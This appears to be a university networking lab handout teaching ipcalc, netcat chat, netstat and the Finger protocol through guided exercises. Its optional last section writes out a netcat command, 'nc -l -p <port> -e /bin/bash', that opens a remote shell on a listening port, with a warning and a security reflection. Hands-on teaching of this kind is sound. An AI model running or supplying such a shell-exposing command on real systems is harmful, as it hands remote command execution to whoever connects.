# Network Programming Lab #2 - Command-line Networking Tools

Welcome to this lab on network programming!

Today we will start with `ipcalc`, then use `nc` (Netcat), `netstat`, and `finger` to see how IP networks, TCP connections, ports, and a very simple application protocol work.

We have only about 50 minutes, so do the tasks in order. The last task is optional if you have time.

## Prerequisites

On `the.hell.am` we use **netcat-traditional**.

Check it with:

```sh
nc -h
```

Important: with this version, to listen on a port use:

```sh
nc -l -p <port_number>
```

To connect to a listening port use:

```sh
nc <host> <port_number>
```

The server also has the `finger` client, and a Finger server is listening on TCP port 79.

---

## Task 1: Calculate IP ranges with `ipcalc`

Before we start opening TCP connections, let's look at IP networks and masks.

Run `ipcalc` interactively:

```sh
ipcalc 192.168.1.13/24
```

Look at the network address, broadcast address, and host range.

Now save the output to a file and check what was written:

```sh
ipcalc 192.168.1.13/24 > ipcalc1.txt
cat ipcalc1.txt
```

There is another useful command, `tee`. It lets you see the output on the screen **and** save it to a file at the same time:

```sh
ipcalc 192.168.1.13/24 | tee ipcalc1.txt
```

Now try a much smaller network, using a `/29` mask:

```sh
ipcalc 192.168.1.13/29 | tee ipcalc2.txt
```

Answer these questions using the `ipcalc` output:

* Network address (`/24`): ______________________
* Broadcast address (`/24`): ______________________
* Usable hosts (`/24`): ______________________
* Network address (`/29`): ______________________
* Broadcast address (`/29`): ______________________
* Usable hosts (`/29`): ______________________

Keep both output files. They are part of your submission:

```text
ipcalc1.txt
ipcalc2.txt
```

---

## Task 2: Chat with yourself using Netcat

You know IP packets. An IP packet contains source and destination addresses.

But imagine that the destination address is a large building with many apartments. Delivering something to the building is not enough; we also need to know which apartment should receive it.

That is roughly what a **port** gives us.

Inside an IP packet we can have a TCP segment. A TCP header contains a **source port** and a **destination port**.

Remember:

**Ethernet frame -> IP packet -> TCP segment**

Enough theory for today. We will discuss ports properly in class.

Choose a port number bigger than 1024 and smaller than 65535. You may use your student ID if it fits in that range.

In one terminal, start Netcat in listening mode:

```sh
nc -l -p <port_number>
```

For example:

```sh
nc -l -p 5555
```

In another terminal, connect to it:

```sh
nc localhost <port_number>
```

For example:

```sh
nc localhost 5555
```

Now type text in both terminals.

What happens?

Use the manual if you want to understand the options:

```sh
man nc
```

![](nc.png)

Alas, you won't have that picture of a cat I have in my system. Eh!

Write down the commands you used and what you observed:

_____________________________

## Task 3: Connect to a fellow student

Now leave a Netcat listener running:

```sh
nc -l -p <port_number>
```

Use `netstat` to look for TCP ports that are listening on the server.

Read the manual if needed:

```sh
man netstat
```

Ask a fellow student which port belongs to them and whether you may connect.

Then connect:

```sh
nc localhost <their_port>
```

Chat for a moment.

What did you use to find the listening port?

_______________________________

## Task 4: Finger yourself and your classmates

Now we will use a real application protocol.

**Finger** is one of the oldest Internet protocols. A Finger server normally listens on **TCP port 79**.

First, finger yourself locally:

```sh
finger "$USER"
```

Look at the output.

Now create a short `.project` file:

```sh
echo 'Network Programming Lab' > ~/.project
```

Create a `.plan` file too:

```sh
nano ~/.plan
```

Write a few lines there: what you are doing today, something you learned, a joke, ASCII art, or anything else you are happy for your classmates to read.

Make both files readable:

```sh
chmod a+r ~/.project ~/.plan
```

Do **not** put passwords, tokens, private information, or secrets there. `.plan` is meant to be readable by other people.

Finger yourself again:

```sh
finger "$USER"
```

Do you see your `.project` and `.plan`?

Now query yourself through the network service:

```sh
finger <your_username>@the.hell.am
```

Then ask a classmate for their username and try:

```sh
finger <classmate>@the.hell.am
```

Ask them to finger you too.

What is the difference between these two commands?

```sh
finger <username>
```

```sh
finger <username>@the.hell.am
```

Write your answer:

_______________________________

## Task 5: Speak the Finger protocol using Netcat

The nice thing about Finger is that it is extremely simple. We do not actually need the `finger` program to speak the protocol.

A Finger server listens on TCP port **79**. Send a username to it using Netcat:

```sh
printf '<username>\r\n' | nc the.hell.am 79
```

For yourself:

```sh
printf '%s\r\n' "$USER" | nc the.hell.am 79
```

Compare the result with:

```sh
finger <username>@the.hell.am
```

So `finger` is a specialized client, while `nc` lets us talk directly to the TCP service.

Why do we use `\r\n` at the end of the request?

_______________________________

Now see what is listening on port 79:

```sh
ss -ltnp | grep ':79'
```

You should see `inetutils-inetd` listening there.

`inetd` is a **super-server**: it listens for connections and starts the small server program only when a request arrives.

Why might old Unix systems have done this instead of keeping every small network service running all the time?

_______________________________

### What if the username is empty?

Try:

```sh
finger @the.hell.am
```

Then send the equivalent request with Netcat:

```sh
printf '\r\n' | nc the.hell.am 79
```

What information does the server reveal?

Could exposing this information have privacy or security implications?

_______________________________

## Task 6: Visit the Fingerverse

Finger is ancient, but it is not quite dead.

These services were alive when this lab was prepared. Try at least **two**:

```sh
finger random@happynetbox.com
finger benbrown@happynetbox.com
finger ring@thebackupbox.net
finger help@crossed-fingers.andros.dev
```

`random@happynetbox.com` points you to a random user's Finger page.

`ring@thebackupbox.net` shows a small modern Finger ring.

`help@crossed-fingers.andros.dev` belongs to a search/aggregation service for Finger accounts.

Now choose one of the services and query it again without the `finger` program.

For example:

```sh
printf 'random\r\n' | nc happynetbox.com 79
```

What does this experiment tell you about the difference between an **application protocol** and a **client program** that implements that protocol?

_______________________________

## Optional: Reverse Shell Simulation (Optional, Advanced, but that's the most funny thing to do today)

> **Warning**: This task is for educational purposes only. Never use this technique on unauthorized systems.

1. On one machine, set up a listening session:
   ```sh
   nc -l -p  <port_number> -e /bin/bash
   ```
2. On another machine, connect to that listening port:
   ```sh
   nc <that_ip> <port_number>
   ```

3. Now do: `ls` or other commands.

4. Reflect on the security implications and how this could be prevented.

_______________________________

## Submission Instructions

After completing the tasks:

1. Edit this `README.md` and write your observations in the empty spaces.
2. Include the important commands you used.
3. Answer the questions in your own words.
4. Make sure these files are present in your repository:

   ```text
   ipcalc1.txt
   ipcalc2.txt
   ```

5. Commit the files, for example:

   ```sh
   git add README.md ipcalc1.txt ipcalc2.txt
   git commit -m "Complete network programming lab"
   ```

6. Push your changes to the repository.

You do not need long essays. Short, clear answers are enough.

Good luck, and have fun exploring networking basics!
